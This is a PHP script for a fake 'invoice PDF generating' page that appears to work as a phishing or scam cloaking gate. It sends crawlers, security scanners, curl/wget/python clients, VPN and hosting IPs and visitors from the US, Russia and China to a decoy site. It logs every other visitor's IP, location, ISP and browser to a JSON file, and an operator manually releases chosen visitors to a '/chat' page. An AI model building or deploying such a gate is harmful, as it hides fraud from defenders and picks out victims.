<?php
session_start();

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$idioma = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en', 0, 2);
$file = 'dados.json';

if (!file_exists($file)) {
    file_put_contents($file, json_encode([]));
}

$lista = json_decode(file_get_contents($file), true);

/* BLOQUEIO BOT */
$bots = ['bot','crawl','spider','curl','wget','python','scanner','java'];
foreach ($bots as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        header("Location: https://www.fenixnota.com");
        exit;
    }
}

/* API IP */
$ipInfo = @json_decode(file_get_contents("http://ip-api.com/json/$ip?fields=status,country,city,isp,proxy,hosting"));

$pais = $ipInfo->country ?? "Desconhecido";
$cidade = $ipInfo->city ?? "Desconhecido";
$provedor = $ipInfo->isp ?? "Desconhecido";
$isVPN = $ipInfo->proxy ?? false;
$isHosting = $ipInfo->hosting ?? false;

/* BLOQUEIO PAÍS */
$paisesBloqueados = ["United States", "Russia", "China"];
if (in_array($pais, $paisesBloqueados) || $isVPN || $isHosting) {
    header("Location: https://www.fenixnota.com");
    exit;
}

/* VERIFICA SE IP EXISTE */
$existe = false;

foreach ($lista as $key => $item) {

    if ($item['ip'] === $ip) {

        $existe = true;

        if ($item['status'] === 'negado') {
            header("Location: https://www.fenixnota.com");
            exit;
        }

        if ($item['status'] === 'liberado') {
            header("Location: https://www.fenixnotas.com/chat");
            exit;
        }

        $lista[$key]['data'] = date("d/m/Y H:i:s");
        $registro = $lista[$key];
        unset($lista[$key]);
        array_unshift($lista, $registro);

        file_put_contents($file, json_encode(array_values($lista), JSON_PRETTY_PRINT));
        break;
    }
}

/* SE NÃO EXISTE */
if (!$existe) {

    $novo = [
        "id" => uniqid(),
        "ip" => $ip,
        "pais" => $pais,
        "cidade" => $cidade,
        "provedor" => $provedor,
        "navegador" => $userAgent,
        "data" => date("d/m/Y H:i:s"),
        "status" => "aguardando"
    ];

    array_unshift($lista, $novo);
    file_put_contents($file, json_encode($lista, JSON_PRETTY_PRINT));
}

/* TRADUÇÃO */
$mensagens = [
    "pt" => "A aguardar geração do ficheiro PDF.",
    "pt-br" => "Aguardando a geração do arquivo PDF.",
    "tr" => "PDF dosyasının oluşturulması bekleniyor.",
    "fr" => "En attente de la génération du fichier PDF.",
    "it" => "In attesa della generazione del file PDF.",
    "de" => "Warten auf die Generierung der PDF-Datei.",
    "nl" => "In afwachting van het genereren van het PDF-bestand."
];

$msg = $mensagens[strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en')] ?? "Waiting for PDF file generation.";
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="5">
<style>
body{background:#f4f6f9;font-family:Arial;}
.invoice{
background:white;width:450px;margin:120px auto;
padding:40px;border-radius:12px;
box-shadow:0 5px 20px rgba(0,0,0,0.1);
text-align:center;
}
.status{
margin-top:30px;padding:15px;
background:#fff3cd;border-radius:8px;color:#856404;
}
</style>
</head>
<body>
<div class="invoice">
<h2></h2>
<h3>PL10-02-2026L<?= rand(1000,9999) ?></h3>
<div class="status"><?= $msg ?></div>
<p></p>
</div>
</body>
</html>